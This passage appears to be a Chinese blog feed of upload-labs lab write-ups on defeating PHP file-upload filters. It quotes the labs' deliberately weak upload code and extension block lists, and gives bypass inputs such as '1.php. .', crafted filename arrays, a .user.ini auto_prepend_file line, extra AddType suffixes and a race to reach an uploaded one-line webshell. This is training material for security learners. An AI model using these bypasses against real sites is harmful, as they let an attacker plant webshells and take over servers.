class="hljs-string">&quot;.html&quot;</span>, <span class="hljs-string">&quot;.xml&quot;</span>, <span class="hljs-string">&quot;.tiff&quot;</span>, <span class="hljs-string">&quot;.jpeg&quot;</span>, <span class="hljs-string">&quot;.png&quot;</span> );<br><br>......<br>......<br>......  <br>  <span class="hljs-comment">/** upload()</span><br><span class="hljs-comment">   **</span><br><span class="hljs-comment">   ** Method to upload the file.</span><br><span class="hljs-comment">   ** This is the only method to call outside the class.</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@para</span> String name of directory we upload to</span><br><span class="hljs-comment">   ** <span class="hljs-doctag">@returns</span> void</span><br><span class="hljs-comment">  **/</span><br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"> <span class="hljs-variable">$dir</span> </span>)</span>&#123;<br>  <br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">isUploadedFile</span>();<br>  <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setDir</span>( <span class="hljs-variable">$dir</span> );<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkExtension</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );<br>    &#125;<br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkSize</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );  <br>    &#125;<br>  <br>    <span class="hljs-comment">// if flag to check if the file exists is set to 1</span><br>  <br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_file_exists == <span class="hljs-number">1</span> )&#123;<br>  <br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">checkFileExists</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );  <br>      &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// if we are here, we are ready to move the file to destination</span><br><br>    <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">move</span>();<br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );  <br>    &#125;<br><br>    <span class="hljs-comment">// check if we need to rename the file</span><br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable language_">$this</span>-&gt;cls_rename_file == <span class="hljs-number">1</span> )&#123;<br>      <span class="hljs-variable">$ret</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">renameFile</span>();<br>      <span class="hljs-keyword">if</span>( <span class="hljs-variable">$ret</span> != <span class="hljs-number">1</span> )&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-variable">$ret</span> );  <br>      &#125;<br>    &#125;<br>  <br>    <span class="hljs-comment">// if we are here, everything worked as planned :)</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">resultUpload</span>( <span class="hljs-string">&quot;SUCCESS&quot;</span> );<br>  <br>  &#125;<br>......<br>......<br>...... <br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>先检查后缀，再到服务器,不能直接上传php文件了，apache从后往前看，不能去解析那个.7z文件那么就会往前面解析php文件</p><p>我们要在重命名之前,对那个访问小马文件进行访问，就可以留下一句话木马</p><p>在上传抓包生成小马文件后，在末尾加上.7z</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apache解析漏洞+条件竞争</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Pass-21</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/Pass-21/</url>
    
    <content type="html"><![CDATA[<h1 id="Pass-21"><a href="#Pass-21" class="headerlink" title="Pass-21"></a>Pass-21</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    <span class="hljs-comment">//检查MIME</span><br>    <span class="hljs-variable">$allow_type</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//检查文件名,是否为空，是空就用文件名字</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file</span>));<br>        &#125;<span class="hljs-comment">//通过‘.’分割勒，就不能用. .绕过，‘.’拿来分割成一个数组</span><br><br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$file</span>);<span class="hljs-comment">//file是个数组，ext后缀是取最后一个值再判断是不是在白名单</span><br>        <span class="hljs-variable">$allow_suffix</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$file</span>) - <span class="hljs-number">1</span>];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>首先检查conteng-type  源码表示只允许jpg，png，gif</p></blockquote><blockquote><p>主要漏洞在数组这里</p></blockquote><p>需要在burp上面更改数组，让在有值的后面几位都是空的，例如file[0]&#x3D;1.php. file[1]’&#x3D;null,file[7]&#x3D;1,还需要更改content-type</p><p><img src="/.com//image-20250202154152-0fqfc21.png" alt="image"></p><p>变成数组的意义提交，第一个是1.php，更改一个比较长的值，第4个就是jpg白名单绕过</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pass-21</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>user.ini</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/user.ini/</url>
    
    <content type="html"><![CDATA[<h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);  <span class="hljs-comment">//分割文件名通过.来分割</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>发现.htaccess也被加入黑名单，所以我们要想其他方法，.user.ini绕过</p><h1 id="user-ini文件写法"><a href="#user-ini文件写法" class="headerlink" title=".user.ini文件写法"></a>.user.ini文件写法</h1><blockquote><p>auto_prepend_file&#x3D;1.jpg   &#x2F;&#x2F;目录下面所有PHP文件都会预先加载1.jpg文件下的内容</p></blockquote><p>‍</p><p>‍</p><h1 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h1><h2 id="点加空格加点"><a href="#点加空格加点" class="headerlink" title="点加空格加点"></a>点加空格加点</h2><p>因为源码并未循环，只过滤了一遍，所以有漏洞可钻,  1.php. .</p><blockquote><p>file_name会变成1.php，然后file_ext读取的是.</p></blockquote><p>由于windows下后缀的.和空格都会自动被删除，所以我们通过burpsuite更改后缀</p><p>很遗憾BUUCFT的源码不一样，但是我自己搭建的靶场也提交错误，所以只能使用大小写绕过，因为在系统下后缀改成大小写会被自动解析成为小写的</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>user.ini</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>别名攻击</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%88%AB%E5%90%8D%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="别名攻击"><a href="#别名攻击" class="headerlink" title="别名攻击"></a>别名攻击</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;.asp&#x27;</span>,<span class="hljs-string">&#x27;.aspx&#x27;</span>,<span class="hljs-string">&#x27;.php&#x27;</span>,<span class="hljs-string">&#x27;.jsp&#x27;</span>);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//收尾去空</span><br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;        <br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>)) &#123;<br>                 <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>只提出了黑名单，可以使用别名攻击</p><p>但是改成php3测试连接返回未空，而且会提示你下载一些东西，说明服务器并没将php3当作php来解析</p><p>所以我没要找到服务器Apache的配置文件httpd.conf然后找到AddType,找到<kbd>#AddType application/x-httpd-php  .php</kbd>​这一句，意思是以什么结尾的服务器会以php认可</p></blockquote><p><img src="/.com//image-20250119180334-7khsgt2.png" alt="image"></p><blockquote><p>添加多一些后缀，也就可以实现别名攻击,还有可能和php版本有问题</p></blockquote><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>文件上传</category>
      
      <category>upload-labs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>别名攻击</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>加空格绕过</title>
    <link href="/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
    <url>/2025/05/20/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/upload-labs/%E5%8A%A0%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="加空格绕过"><a href="#加空格绕过" class="headerlink" title="加空格绕过"></a>加空格绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<br>        <span 